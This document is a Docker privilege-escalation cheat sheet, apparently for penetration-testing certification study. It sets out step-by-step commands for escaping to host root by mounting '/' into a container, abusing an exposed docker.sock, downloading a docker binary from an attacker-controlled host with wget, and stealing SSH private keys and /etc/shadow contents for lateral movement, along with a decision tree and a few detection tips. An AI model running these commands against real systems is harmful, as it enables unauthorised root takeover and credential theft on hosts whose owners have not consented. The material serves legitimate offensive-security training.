ğŸ³ Docker Privilege Escalation â€“ CPTS Breakdown
ğŸ§  Summary
Docker containers run applications in isolated environments, but when misconfigured (e.g., being in the docker group or a writable docker.sock), attackers can:

Mount the host filesystem

Interact with Docker as root

Escape containers

Create containers with elevated permissions

ğŸ§­ Got This? Do That â€“ Docker Attack Workflow
âœ… Youâ€™re in the docker group or can use Docker
bash
Copy
Edit
id | grep docker
â¡ï¸ Mount root filesystem from host and spawn container:

bash
Copy
Edit
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
ğŸŸ¢ Result: You now have full root access to the host.

ğŸ” You found a Docker socket (e.g., /app/docker.sock)
bash
Copy
Edit
find / -name docker.sock 2>/dev/null
â¡ï¸ Download Docker binary (if not present):

bash
Copy
Edit
wget http://<attacker-ip>:443/docker -O docker
chmod +x docker
â¡ï¸ Use the socket to list running containers:

bash
Copy
Edit
./docker -H unix:///app/docker.sock ps
â¡ï¸ Mount the hostâ€™s root dir with a new container:

bash
Copy
Edit
./docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
â¡ï¸ Exec into it:

bash
Copy
Edit
./docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash
cd /hostsystem
ğŸŸ¢ You now control the host filesystem as root.

ğŸ“ You notice a shared folder inside the container
â¡ï¸ Example path:

bash
Copy
Edit
cd /hostsystem/home/cry0l1t3/.ssh
cat id_rsa > cry0l1t3.priv
â¡ï¸ Use the key to SSH into the host:

bash
Copy
Edit
chmod 600 cry0l1t3.priv
ssh -i cry0l1t3.priv cry0l1t3@<host-ip>
ğŸ”¥ Escalation Patterns to Remember
ğŸ” Finding	ğŸ’¥ Escalation Path
docker group	Full root access via mount/chroot
Writable docker.sock	Spawn root containers
Volume mount to /	Host system exposure
Docker binary inside container + socket	Use to control host via API
SSH private keys in mounted folders	Lateral movement to real user accounts
docker-compose.yml or leftover configs	May include credentials or mounted paths
ğŸš¨ Tips & Pitfalls
Always check if Docker binary is inside the container, or upload your own.

Check for shared/mounted host paths â€” especially to /root, /home, /etc.

If docker is installed with SUID (chmod u+s) â€” it might be exploitable even without being in the group.

Donâ€™t forget to check:

bash
Copy
Edit
docker images
docker ps -a
docker inspect <container>
for more info on volumes, commands, and entrypoints.

âš¡ TL;DR One-Liner â€“ Root via Docker Group
bash
Copy
Edit
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash


  [ You land on a box ]
       â”‚
       â–¼
[ Am I in the docker group? ]
       â”‚
       â”œâ”€â”€ Yes â†’ ğŸŸ¢ Run a root container to escape to host
       â”‚          docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
       â”‚
       â””â”€â”€ No â†’
              â”‚
              â–¼
     [ Is /var/run/docker.sock or any *.sock exposed & writable? ]
              â”‚
              â”œâ”€â”€ Yes â†’
              â”‚     â”‚
              â”‚     â”œâ”€â”€ Is docker binary present in the container?
              â”‚     â”‚      â”œâ”€â”€ Yes â†’ use it with:
              â”‚     â”‚      â”‚       docker -H unix:///path/to/socket ps
              â”‚     â”‚      â”‚       docker -H unix:///path/to/socket run --rm -it -v /:/mnt --privileged ubuntu chroot /mnt bash
              â”‚     â”‚      â”‚
              â”‚     â”‚      â””â”€â”€ No â†’ upload docker binary:
              â”‚     â”‚              wget http://attacker-ip:443/docker -O docker
              â”‚     â”‚              chmod +x docker
              â”‚     â”‚              Then repeat above
              â”‚     â”‚
              â”‚     â””â”€â”€ Profit: access `/mnt` = full host root FS access
              â”‚
              â””â”€â”€ No â†’
                     â”‚
                     â–¼
        [ Can I exec into running containers? ]
                     â”‚
                     â”œâ”€â”€ Yes â†’
                     â”‚     docker ps
                     â”‚     docker exec -it <container> /bin/bash
                     â”‚     Then look for:
                     â”‚     - Mounted host paths (e.g., /hostsystem, /mnt/root, /data)
                     â”‚     - SSH keys or config files
                     â”‚
                     â””â”€â”€ No â†’
                            â”‚
                            â–¼
               [ Check for mount volumes in container metadata ]
                            â”‚
                            â””â”€â”€ docker inspect <container>
                                   Look for HostConfig.Binds or Mounts
                                   â†’ Anything mounted from `/`, `/home`, `/root`, etc?
                                   â†’ Mount RW host path if possible

ğŸ§  Quick Tells Youâ€™re in a Host-Mounted Container
ls /hostsystem shows full host FS layout

cat /hostsystem/root/.ssh/id_rsa or /etc/shadow gives real creds

You can chroot /hostsystem â†’ instant root

.sock files in weird places (/app/docker.sock, /tmp/docker.sock) = gateway to Docker daemon

ğŸ§ª Additional Quick Checks
bash
Copy
Edit
id | grep docker           # Docker group?
ls -l /var/run/docker.sock # World-writable or owned by docker?
docker image ls            # Available images to abuse
docker ps -a               # Running containers to inspect/exec into
docker inspect <container> # Volumes and binds
ğŸ›¡ï¸ Bonus Detection Check for Blue Team/OPSEC
If youâ€™re doing this in real life (or a monitored lab):

Enumerating Docker images/containers often logs to Docker's event log

Spawning a container from a mounted volume (-v /:/mnt) is very suspicious

If AppArmor or seccomp is enabled, you might be blocked or limited


